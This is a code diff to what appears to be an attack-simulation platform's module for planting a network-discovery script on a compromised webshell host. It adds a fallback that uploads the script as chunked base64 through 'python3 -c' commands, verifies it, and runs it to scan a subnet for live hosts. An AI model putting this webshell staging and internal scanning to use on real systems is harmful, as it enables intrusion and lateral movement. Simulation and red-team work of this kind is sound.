@@ -2,6 +2,7 @@
 
 from __future__ import annotations
 
+import base64
 import json
 import shlex
 from pathlib import Path
@@ -38,6 +39,7 @@ DISCOVERY_RUNNER_NAME = "discover_runner.py"
 DISCOVERY_RUNNER_ASSET = (
     Path(__file__).resolve().parent / "assets" / "webshell_discovery_runner.py"
 )
+_BASE64_UPLOAD_CHUNK_CHARS = 2000
 
 
 def resolve_discovery_scan_max_hosts(
@@ -333,6 +335,70 @@ def parse_deployed_discovery_output(raw: bytes) -> dict[str, Any]:
     return payload
 
 
+def _upload_discovery_runner_asset(provider: Any, remote_script: str) -> str:
+    """Stage discover_runner.py on the webshell host (multipart, pipe, or python base64)."""
+    from dsp.execution.remote.bundle.upload import upload_remote_file_verified
+    from dsp.execution.remote.exceptions import RemoteArtifactUploadError
+
+    try:
+        result = upload_remote_file_verified(provider, DISCOVERY_RUNNER_ASSET, remote_script)
+        return result.method
+    except RemoteArtifactUploadError:
+        pass
+
+    return _upload_discovery_runner_via_python_base64(provider, remote_script)
+
+
+def _upload_discovery_runner_via_python_base64(provider: Any, remote_script: str) -> str:
+    payload = DISCOVERY_RUNNER_ASSET.read_bytes()
+    encoded = base64.b64encode(payload).decode("ascii")
+    provider.run_remote_command(
+        wrap_remote_shell_command(f": > {shlex.quote(remote_script)}"),
+        timeout_seconds=30.0,
+    )
+    for offset in range(0, len(encoded), _BASE64_UPLOAD_CHUNK_CHARS):
+        chunk = encoded[offset : offset + _BASE64_UPLOAD_CHUNK_CHARS]
+        write_script = (
+            "import base64;"
+            f"p={remote_script!r};d={chunk!r};"
+            "open(p,'ab').write(base64.b64decode(d.encode()))"
+        )
+        provider.run_remote_command(
+            wrap_remote_shell_command(f"python3 -c {shlex.quote(write_script)}"),
+            timeout_seconds=60.0,
+        )
+
+    expected_size = DISCOVERY_RUNNER_ASSET.stat().st_size
+    size_raw = provider.run_remote_command(
+        wrap_remote_shell_command(f"wc -c < {shlex.quote(remote_script)} 2>&1"),
+        timeout_seconds=30.0,
+    )
+    size_text = normalize_webshell_command_output(size_raw).split()[0:1]
+    if not size_text or not size_text[0].isdigit() or int(size_text[0]) < expected_size:
+        raise ValueError(
+            "discover_runner python base64 upload verification failed "
+            f"(expected>={expected_size}, got={normalize_webshell_command_output(size_raw)!r})"
+        )
+    return "python_base64"
+
+
+def _emit_webshell_discovery_activity(ctx: Any, scenario_id: str, targets: dict[str, Any]) -> None:
+    from dsp.engine.scenario_engine import emit_activity
+
+    meta = dict(targets.get("discovery_meta") or {})
+    emit_activity(
+        ctx,
+        scenario_id,
+        kind="discovery",
+        discovery_method=meta.get("discovery_method"),
+        alive_hosts=len(meta.get("alive_hosts") or []),
+        open_endpoints=meta.get("open_endpoints", 0),
+        deploy_error=meta.get("deploy_error"),
+        output_preview=meta.get("output_preview"),
+        upload_method=meta.get("upload_method"),
+    )
+
+
 def run_deployed_webshell_discovery(
     provider: Any,
     request: Any,
@@ -346,30 +412,26 @@ def run_deployed_webshell_discovery(
             wrap_remote_shell_command(f"mkdir -p {shlex.quote(remote_dir)}"),
             timeout_seconds=30.0,
         )
-        provider.upload_file(DISCOVERY_RUNNER_ASSET, remote_script)
-        expected_size = DISCOVERY_RUNNER_ASSET.stat().st_size
-        size_raw = provider.run_remote_command(
-            f"wc -c < {shlex.quote(remote_script)} 2>&1",
-            timeout_seconds=30.0,
-        )
-        size_text = normalize_webshell_command_output(size_raw).split()[0:1]
-        if not size_text or not size_text[0].isdigit() or int(size_text[0]) < expected_size:
-            raise ValueError(
-                "discover_runner upload verification failed "
-                f"(expected>={expected_size}, got={normalize_webshell_command_output(size_raw)!r})"
-            )
+        upload_method = _upload_discovery_runner_asset(provider, remote_script)
 
-        run_pipeline = (
+        run_command = (
             f"python3 {shlex.quote(remote_script)} "
             f"{shlex.quote(target_net)} {int(discovery_max_hosts)} "
-            f"{shlex.quote(remote_output)} {DEFAULT_REMOTE_DISCOVERY_TIMEOUT}; "
-            f"cat {shlex.quote(remote_output)}"
+            f"{shlex.quote(remote_output)} {DEFAULT_REMOTE_DISCOVERY_TIMEOUT}"
         )
-        raw = provider.run_remote_command(
-            wrap_remote_shell_command(run_pipeline),
+        provider.run_remote_command(
+            wrap_remote_shell_command(run_command),
             timeout_seconds=max(180.0, discovery_max_hosts * 2.0),
         )
-        return parse_deployed_discovery_output(raw)
+        raw = provider.run_remote_command(
+            wrap_remote_shell_command(f"cat {shlex.quote(remote_output)} 2>&1"),
+            timeout_seconds=60.0,
+        )
+        targets = parse_deployed_discovery_output(raw)
+        discovery_meta = dict(targets.get("discovery_meta") or {})
+        discovery_meta["upload_method"] = upload_method
+        targets["discovery_meta"] = discovery_meta
+        return targets
     except (ValueError, json.JSONDecodeError) as exc:
         return _failed_deployed_discovery_targets(
             target_net,
@@ -420,10 +482,6 @@ def _failed_deployed_discovery_targets(
         "discovery_meta": discovery_meta,
     }
 
-
-def _discovery_transport_failed(targets: dict[str, Any]) -> bool:
-    meta = targets.get("discovery_meta") or {}
-    return bool(meta.get("parse_failed") or meta.get("deploy_error"))
 
 
 def get_cached_remote_discovery(
@@ -484,18 +542,7 @@ def run_webshell_host_discovery(
         target_net,
         discovery_max_hosts,
     )
-    if _discovery_transport_failed(targets):
-        fallback = run_discovery_from_tcp_probes(
-            provider,
-            target_net,
-            probe_specs,
-            run_id=str(getattr(request, "run_id", "") or ""),
-            on_probe_batch=on_probe_batch,
-        )
-        fallback_meta = dict(fallback.get("discovery_meta") or {})
-        fallback_meta["discovery_fallback"] = "tcp_probe_batch_sh"
-        fallback["discovery_meta"] = fallback_meta
-        targets = fallback
+    _emit_webshell_discovery_activity(ctx, str(getattr(request, "scenario_id", "") or ""), targets)
 
     cache_remote_discovery(ctx.config.scenario_params, targets)
     return targets
